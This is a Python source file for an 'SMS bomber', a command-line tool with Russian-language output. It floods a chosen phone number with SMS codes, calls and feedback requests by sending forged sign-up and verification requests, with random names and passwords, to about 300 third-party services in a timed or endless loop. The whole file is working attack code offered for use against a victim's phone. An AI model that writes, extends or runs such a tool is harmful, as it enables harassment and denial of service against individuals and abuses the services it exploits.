import argparse
import time
import requests
import random
import re
from Sites import sms_urls, call_urls
from Services import urls as services_urls
from Feedback_Services import feedback_urls
from Core.Attack.Tools.Email import email

class Attack:
    r = 0
    START_TIME = None
    CURRENT_SITES = []
    CURRENT_INDEX = 0
    
    # Attack types and their corresponding functions
    ATTACK_MODES = {
        'SMS': {
            'primary': sms_urls,      # 44 SMS сервисов из Sites.py
            'secondary': services_urls,  # ~150+ SMS сервисов из Services.py
        },
        'CALL': {
            'primary': call_urls,     # 3 CALL сервисов из Sites.py
        },
        'FEEDBACK': {
            'primary': feedback_urls, # ~130+ FEEDBACK сервисов из Feedback_Services.py
        }
    }
    
    @staticmethod
    def config_phone(_phone):
        _phone9 = _phone[1:]
        _phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
        _phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
        _phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
        _phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
        _phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
        _name = ''
        _email = email()
        for _ in range(12):
            _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        
        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

        return {
            '_email': _email,
            '_name': _name,
            'password': password,
            'username': username,
            '_password': password,
            '_username': username,
            '_phone': _phone,
            '_phone9': _phone9,
            '_phoneAresBank': _phoneAresBank,
            '_phone9dostavista': _phone9dostavista,
            '_phoneOstin': _phoneOstin,
            '_phonePizzahut': _phonePizzahut,
            '_phoneGorzdrav': _phoneGorzdrav,
        }
    
    @property
    def check_in_time(self):
        if self.time_range is None:
            return True
        if time.time() - self.START_TIME < self.time_range:
            return True
        return False 

    def __init__(self, _phone, _type='SMS', time_range=None, timeout=2):
        """
        Initialize attack with support for multiple service sources.
        Supports: SMS, CALL, FEEDBACK attack types
        """
        self.phone = _phone
        self.timeout = timeout
        self.time_range = time_range
        self._type = _type.upper()

        if self.START_TIME is None:
            self.START_TIME = time.time()
        
        # Load all available services for the attack type
        self._load_services()

    def _load_services(self):
        """Load all available services for the selected attack type"""
        if self._type not in self.ATTACK_MODES:
            print(f"[-] Неизвестный тип атаки: {self._type}")
            print(f"[*] Доступные типы: {', '.join(self.ATTACK_MODES.keys())}")
            return
        
        modes = self.ATTACK_MODES[self._type]
        self.CURRENT_SITES = []
        
        # Load primary sources
        if 'primary' in modes:
            try:
                primary_services = modes['primary'](self.phone)
                self.CURRENT_SITES.extend(primary_services)
                print(f"[+] Загружено {len(primary_services)} сервисов из основного источника")
            except Exception as e:
                print(f"[-] Ошибка при загрузке основных сервисов: {e}")
        
        # Load secondary sources (if available)
        if 'secondary' in modes:
            try:
                secondary_services = modes['secondary'](self.phone)
                self.CURRENT_SITES.extend(secondary_services)
                print(f"[+] Загружено {len(secondary_services)} сервисов из вторичного источника")
            except Exception as e:
                print(f"[-] Ошибка при загрузке вторичных сервисов: {e}")
        
        print(f"[*] Всего доступно сервисов для {self._type}: {len(self.CURRENT_SITES)}")
        self.CURRENT_INDEX = 0

    def config_attack(self):
        """Get next service configuration from the loaded list"""
        if self.CURRENT_INDEX < len(self.CURRENT_SITES):
            service_config = self.CURRENT_SITES[self.CURRENT_INDEX]
            self.CURRENT_INDEX += 1
            
            # Ensure it's a dict copy to avoid modification of original
            returned = dict(service_config)
            
            # Format all string values with phone configurations
            config = self.config_phone(self.phone)
            
            # Process data/json/params fields
            for field in ['data', 'json', 'params']:
                if field in returned and isinstance(returned[field], dict):
                    returned[field] = self._format_dict_values(returned[field], config)
            
            # Process headers
            if 'headers' in returned and isinstance(returned['headers'], dict):
                returned['headers'] = self._format_dict_values(returned['headers'], config)
            
            return returned
        else:
            return None

    def _format_dict_values(self, data_dict, config):
        """Recursively format all string values in a dictionary"""
        try:
            formatted = {}
            for key, value in data_dict.items():
                if isinstance(value, str):
                    # Try to format the string with phone config
                    try:
                        formatted[key] = value.format(**config)
                    except (KeyError, ValueError):
                        # If formatting fails, keep original value
                        formatted[key] = value
                elif isinstance(value, dict):
                    # Recursively format nested dicts
                    formatted[key] = self._format_dict_values(value, config)
                elif isinstance(value, list):
                    # Format items in lists
                    formatted[key] = [
                        item.format(**config) if isinstance(item, str) else item 
                        for item in value
                    ]
                else:
                    formatted[key] = value
            return formatted
        except Exception as exc:
            print(f"[!] Ошибка при форматировании данных: {exc}")
            return data_dict
    
    def get_request(self, url, method, **kwargs):
        """Execute HTTP request to target service"""
        try:
            # Extract only relevant kwargs for requests
            request_kwargs = {}
            for key in ['data', 'json', 'params', 'headers', 'cookies']:
                if key in kwargs:
                    request_kwargs[key] = kwargs[key]
            
            request_kwargs['timeout'] = self.timeout
            
            r = getattr(requests, method.lower())(url, **request_kwargs)
            return r.status_code
        except requests.exceptions.ReadTimeout:
            return 408
        except requests.exceptions.ConnectionError:
            return 400
        except requests.exceptions.TooManyRedirects:
            return 310
        except Exception as e:
            return 500
            
    def circle(self):
        """Main attack loop"""
        print(f"\n[*] Начинается атака типа {self._type} на номер {self.phone}")
        print(f"[*] Временной лимит: {self.time_range} секунд" if self.time_range else "[*] Без временного лимита")
        print("-" * 60)
        
        while True:
            if self.check_in_time:
                r = self.run()
                if r is None:
                    # Restart services if all have been used
                    print(f"\n[*] Перезагрузка сервисов для {self._type}...")
                    self._load_services()
            else:
                self._print_summary()
                break

    def run(self):
        """Execute single attack"""
        query = self.config_attack()
        if query:
            code = self.get_request(
                url=query.get('url'),
                method=query.get('method', 'post'),
                **{k: v for k, v in query.items() if k not in ['url', 'method', 'info']}
            )
            
            if int(code) < 300:
                self.r += 1
                try:
                    website = query.get('info', {}).get('website', 'Unknown')
                    country = query.get('info', {}).get('country', 'Unknown')
                    print(f"[✓] {code} | {website} ({country}) | Успешно отправлено #{self.r}")
                except KeyError:
                    print(f"[✓] {code} | Успешно отправлено #{self.r}")
            else:
                try:
                    website = query.get('info', {}).get('website', 'Unknown')
                    print(f"[✗] {code} | {website} | Ошибка")
                except KeyError:
                    print(f"[✗] {code} | Не отправлено")
            
            # Add delay between requests
            time.sleep(random.uniform(0.5, 1.5))
            return code
        else:
            return None

    def _print_summary(self):
        """Print attack summary"""
        elapsed_time = time.time() - self.START_TIME
        print("-" * 60)
        print(f"\n[+] Атака завершена!")
        print(f"[+] Тип атаки: {self._type}")
        print(f"[+] Успешных отправок: {self.r}")
        print(f"[+] Время атаки: {elapsed_time:.2f} секунд")
        print(f"[+] Скорость: {self.r/elapsed_time:.2f} запросов/сек\n")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='PythonSmsBomber - SMS/CALL/FEEDBACK Flood Tool (300+ сервисов)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Примеры использования:
  python bomber.py +79991234567 -t SMS
  python bomber.py +79991234567 -t SMS -r 60
  python bomber.py +79991234567 -t CALL -r 30
  python bomber.py +79991234567 -t FEEDBACK
        '''
    )
    parser.add_argument('phone', action='store', help='Целевой номер телефона')
    parser.add_argument(
        '-t', '--type', 
        action='store', 
        dest='type', 
        default='SMS',
        choices=['SMS', 'CALL', 'FEEDBACK'],
        help='Тип атаки (по умолчанию: SMS)'
    )
    parser.add_argument(
        '-r', '--range', 
        action='store', 
        dest='range', 
        default=None, 
        type=int,
        help='Длительность атаки в секундах (без лимита если не указано)'
    )
    
    args = parser.parse_args()
    
    try:
        attack = Attack(args.phone, _type=args.type, time_range=args.range)
        attack.circle()
    except KeyboardInterrupt:
        print("\n\n[!] Атака прервана пользователем")
        if attack.r > 0:
            print(f"[+] Всего отправлено: {attack.r}")
    except Exception as e:
        print(f"[-] Критическая ошибка: {e}")
